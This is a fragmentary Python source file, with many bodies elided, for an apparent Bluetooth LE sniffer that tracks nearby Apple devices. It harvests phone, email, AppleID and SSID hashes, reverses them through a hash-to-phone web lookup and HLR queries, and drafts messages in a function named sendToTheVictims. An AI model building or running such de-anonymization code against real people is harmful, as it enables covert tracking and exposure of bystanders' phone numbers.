...
# Feature just used for development
try:
    from hass import update_device_state
except ModuleNotFoundError:
    def update_device_state(mac, attr, present):
        pass

from rollover import correlate_devices
...
parser.add_argument(
    "-r", "--check_region", action="store_true", help="Get phone number region info"
)
parser.add_argument(
    "-l",
    "--check_hlr",
...
parser.add_argument("--rate", type=int, default=1, help="sample rate 1 out of <rate> packets")
...
# These are global data structures. Yuch. I'm not going to refactor
# this but instead continue the hack. I'm adding these to builtins so that
# they can be available from imported modules. I want to have imported modules
# so I can test effectively. I'm not going to rewrite this entire soup of a file.
builtins.phones = {}
builtins.resolved_devs = []
builtins.resolved_macs = []

sock = 0
titles = ["Mac", "State", "Device", "WI-FI", "OS", "Seq", "Alias", "Time"]
...
class MyGrid(npyscreen.GridColTitles):
    def custom_print_cell(self, actual_cell, cell_display_value):
        if (
            "Off" in cell_display_value
            or "<error>" in cell_display_value
            or "iOS10" in cell_display_value
            or "iOS11" in cell_display_value
        ):
            actual_cell.color = "DANGER"
        elif (
            "Home screen" in cell_display_value
            or "On" in cell_display_value
            or cell_display_value[0:3] in "\n".join(dev_types)
            or "X" in cell_display_value
            or "Calling" in cell_display_value
            or cell_display_value in airpods_states.values()
            or "WatchOS" in cell_display_value
            or "Watch" in cell_display_value
            or "iOS13" in cell_display_value
            or "Connecting" in cell_display_value
            or "WiFi screen" in cell_display_value
            or "Incoming" in cell_display_value
            or "Outgoing" in cell_display_value
        ):
...
class MainForm(npyscreen.FormBaseNew):
    def create(self):
        ...
        if args.airdrop:
            self.gd = self.add(
                MyGrid, col_titles=titles, column_width=20, max_height=y // 2
            )
    ...
    def get_dev_name(self, mac_addr):
        ...
        if dev_name:
            d_n_hex = (
                dev_name.split(b"value:")[1].replace(b" ", b"").replace(b"\n", b"")
            )
        ...
        if cell == "Phone":
            if self.get_phone_val_from_cell() == "X":
                hashinfo = "Phone hash={}, email hash={}, AppleID hash={}, SSID hash={} ({})".format(
                    ...
                    get_dict_val(
                        dictOfss, hash2phone[self.get_mac_val_from_cell()]["SSID_hash"]
                    ),
                )
...
def clear_zombies():
    ...
    for k in list(phones):
        if k in resolved_devs or k in resolved_macs:
            pass
            update_device_state(k, phones[k], True)
        if cur_time - phones[k]["time"] > args.ttl:
            update_device_state(k, phones[k], False)
            del phones[k]
...
def print_results():
    ...
    clear_zombies()
    row = []
    for phone in sorted(phones, key=lambda x: phones[x].get("seq", "--")):
        if phones[phone].get("seq", None) is None: continue
        row.append(
            [
                phone,
                phones[phone]["state"],
                ...
                phones[phone]["wifi"],
                phones[phone]["os"],
                phones[phone].get("seq", "--"),
                phones[phone].get("alias", "--"),
                phones[phone]["time"],
            ]
        )
    return row
...
def parse_wifi_j(mac, data):
    ...
    if mac not in victims:
        ...
        if resolved_macs.count(mac):
            ...
            phones[mac]["phone"] = "X"
            hash2phone[mac] = {
                "ph_hash": result["phone_hash"],
                "email_hash": result["email_hash"],
                "appleID_hash": result["appleID_hash"],
                "SSID_hash": result["ssid_hash"],
...
def get_phone_web(hash):
    global phone_number_info
    r = requests.get(
        hash2phone_url, proxies=proxies, params={"hash": hash}, verify=verify
    )
...
def get_hlr_info(mac):
    global phone_number_info
    r = requests.get(
        hlr_api_url + ",".join(phone_number_info.keys()), proxies=proxies, verify=verify
    )
    if r.status_code == 200:
        result = r.json()
        for info in result:
...
def get_region(phone):
    ...
    if r.status_code == 200:
        ...
        region = (
            re.findall(r"Region:(.*?)L", text, flags=re.DOTALL)[0]
            .replace("<br/>", "")
            .replace("\n", "")
        )
...
def sendToTheVictims(SSID_hash):
    ...
    for phone in phone_number_info:
        if phone_number_info[phone]["name"] and get_dict_val(dictOfss, SSID_hash):
            text = "Hi {}! Looks like you have tried to connect to WiFi:{}".format(
                phone_number_info[phone]["name"], get_dict_val(dictOfss, SSID_hash)
            )
...
def print_results3(data):
    ...
    for dev in u_data:
        x.add_row(
            [dev["name"], dev["host"], dev["os"], dev["discoverable"], dev["address"]]
        )
    return x.get_string()
